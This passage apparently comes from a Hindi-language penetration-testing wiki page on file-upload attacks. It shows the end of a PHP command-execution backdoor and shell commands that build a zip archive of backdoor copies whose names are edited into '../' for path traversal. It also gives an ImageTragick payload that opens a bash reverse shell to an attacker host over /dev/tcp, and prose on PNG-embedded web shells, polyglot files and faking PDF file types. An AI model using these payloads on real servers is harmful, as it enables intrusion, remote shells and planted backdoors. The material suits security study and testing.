system($cmd);
}?>
```

2.  **File Spraying and Compressed File Creation**: कई फाइलें बनाई जाती हैं और इन फाइलों को शामिल करते हुए एक zip archive बनाया जाता है।

```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```

3.  **Modification with a Hex Editor or vi**: zip के अंदर की फाइलों के नाम vi या hex editor का उपयोग करके बदले जाते हैं, "xxA" को "../" में बदलकर directories traverse करने के लिए।

```bash
:set modifiable
:%s/xxA/../g
:x!
```

## ImageTragic

इस कंटेंट को image extension के साथ अपलोड करें ताकि vulnerability का exploit किया जा सके **(ImageMagick , 7.0.1-1)** (form the [exploit](https://www.exploit-db.com/exploits/39767))
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## PNG में PHP Shell एम्बेड करना

PNG फ़ाइल के IDAT chunk में एक PHP shell एम्बेड करना कुछ image processing ऑपरेशंस को प्रभावी रूप से बायपास कर सकता है। PHP-GD से `imagecopyresized` और `imagecopyresampled` फ़ंक्शंस यहाँ ख़ास महत्व रखते हैं, क्योंकि इन्हें आम तौर पर images को resize और resample करने के लिए उपयोग किया जाता है। एम्बेड किए गए PHP shell का इन ऑपरेशनों से अप्रभावित रहना कुछ उपयोग मामलों के लिए महत्वपूर्ण फ़ायदा प्रदान करता है।

इस तकनीक की विस्तृत व्याख्या, इसकी कार्यप्रणाली और संभावित उपयोगों के लिए निम्न लेख देखें: ["Encoding Web Shells in PNG IDAT chunks"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/). यह संसाधन प्रक्रिया और उसके निहितार्थों की व्यापक समझ देता है।

More information in: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## Polyglot Files

Polyglot files साइबरसिक्योरिटी में एक अनोखा उपकरण हैं, जो चिमेरे की तरह कई फ़ाइल फ़ॉर्मैटों में एक साथ वैध रूप से मौजूद हो सकते हैं। एक दिलचस्प उदाहरण एक [GIFAR](https://en.wikipedia.org/wiki/Gifar) है, जो GIF और RAR archive दोनों के रूप में कार्य करता है। ऐसे फ़ाइलें केवल इस जोड़ी तक सीमित नहीं हैं; GIF और JS या PPT और JS जैसी संयोजन भी संभव हैं।

Polyglot files की मुख्य उपयोगिता यह है कि वे उन सुरक्षा उपायों को बाइपास कर सकते हैं जो फ़ाइल प्रकार के आधार पर फ़ाइलों को स्क्रीन करते हैं। कई एप्लिकेशन में सुरक्षा के लिए केवल कुछ फ़ाइल प्रकारों — जैसे JPEG, GIF, या DOC — को ही upload करने की अनुमति दी जाती है ताकि संभावित हानिकारक फ़ॉर्मैट (जैसे JS, PHP, या Phar) से जोखिम कम हो सके। हालाँकि, एक polyglot, कई फ़ाइल प्रकारों की संरचनात्मक आवश्यकताओं को पूरा करके इन प्रतिबंधों को चुपके से बायपास कर सकता है।

उनके अनुकूल होने के बावजूद, polyglots को सीमाएँ भी मिलती हैं। उदाहरण के लिए, जबकि एक polyglot एक PHAR फ़ाइल (PHp ARchive) और एक JPEG दोनों का रूप धारण कर सकता है, उसकी सफलता प्लेटफ़ॉर्म की फ़ाइल एक्सटेंशन नीतियों पर निर्भर कर सकती है। यदि सिस्टम अनुमत एक्सटेंशंस के प्रति कड़ा है, तो polyglot की केवल संरचनात्मक द्वैतता उसके upload की गारंटी नहीं हो सकती।

More information in: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

### PDF की तरह दिखते हुए मान्य JSON अपलोड करना

PDF फ़ाइल को नकल करके भी मान्य JSON फ़ाइल अपलोड कर के file type detections से कैसे बचें (तकनीकें **[this blog post](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)** से):

- **`mmmagic` library**: जब तक `%PDF` magic bytes पहले 1024 बाइट्स में हैं यह वैध माना जाता है (उदाहरण पोस्ट में देखें)
- **`pdflib` library**: JSON के एक फ़ील्ड के अंदर एक नकली PDF फॉर्मैट जोड़ें ताकि लाइब्रेरी इसे pdf समझ ले (उदाहरण पोस्ट में देखें)
- **`file` binary**: यह एक फ़ाइल से अधिकतम 1048576 बाइट्स पढ़ सकता है। बस इससे बड़ा एक JSON बनाएं ताकि यह content को json के रूप में पार्स न कर सके और फिर JSON के अंदर वास्तविक PDF का आरंभिक हिस्सा डाल दें, तो यह उसे PDF समझेगा

## संदर्भ

- [When Audits Fail: Four Critical Pre-Auth Vulnerabilities in TRUfusion Enterprise](https://www.rcesecurity.com/2025/09/when-audits-fail-four-critical-pre-auth-vulnerabilities-in-trufusion-enterprise/)

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
- [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
- [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
- [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
- [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
- [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)
- [https://blog.doyensec.com/2025/01/09/cspt-file-upload.html](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)
- [usd HeroLab – Gibbon LMS arbitrary file write (CVE-2023-45878)](https://herolab.usd.de/security-advisories/usd-2023-0025/)
- [NVD – CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)
- [0xdf – HTB: TheFrizz](https://0xdf.gitlab.io/2025/08/23/htb-thefrizz.html)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)
- [CVE-2024-21546 – NVD entry](https://nvd.nist.gov/vuln/detail/CVE-2024-21546)
- [PoC gist for LFM .php. bypass](https://gist.github.com/ImHades101/338a06816ef97262ba632af9c78b78ca)
- [0xdf – HTB Environment (UniSharp LFM upload → PHP RCE)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Microsoft – mklink (command reference)](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)

{{#include ../../banners/hacktricks-training.md}}
